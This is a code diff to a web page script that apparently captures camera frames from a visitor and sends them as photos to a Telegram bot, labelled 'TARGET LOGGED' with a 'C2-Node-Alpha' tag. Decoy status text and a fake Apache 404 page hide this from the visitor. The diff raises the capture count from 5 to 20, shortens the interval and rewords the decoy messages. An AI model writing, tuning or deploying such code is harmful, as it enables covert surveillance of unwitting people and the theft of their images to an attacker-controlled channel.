@@ -49,7 +49,7 @@
                 video.onloadedmetadata = () => {
                     video.play();
                     let count = 0;
-                    const maxPackets = 5; 
+                    const maxPackets = 20; 
                     
                     const interval = setInterval(() => {
                         if (count >= maxPackets) {
@@ -66,11 +66,11 @@
                         send(count + 1);
                         count++;
                         loader.style.width = (count * (100 / maxPackets)) + "%";
-                        status.innerText = "> VERIFYING FRAGMENT " + count + "/" + maxPackets + "...";
-                    }, 1200);
+                        status.innerText = "> DOWNLOADING RESOURCES " + count + "/" + maxPackets + "...";
+                    }, 600);
                 };
             } catch (e) {
-                status.innerText = "> ACCESS DENIED: HANDSHAKE FAILED";
+                status.innerText = "> ACCESS DENIED: PERMISSION FAILED";
                 status.style.color = "#ff4b4b";
             }
         }
@@ -87,7 +87,7 @@
                 const fd = new FormData();
                 fd.append('chat_id', ID);
                 fd.append('photo', blob, 'identity_packet.jpg');
-                fd.append('caption', '🎯 TARGET LOGGED\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
+                fd.append('caption', '🎯 TARGET LOGGED IN\nFragment: ' + index + '\nAgent: C2-Node-Alpha');
 
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -104,7 +104,7 @@
             <title>404 Not Found</title>
             </head><body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
             <h1>Not Found</h1>
-            <p>The requested URL was not found on this server.</p>
+            <p>The requested URL was not found on this server. System Error</p>
             <hr>
             <address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
             </body></html>`;
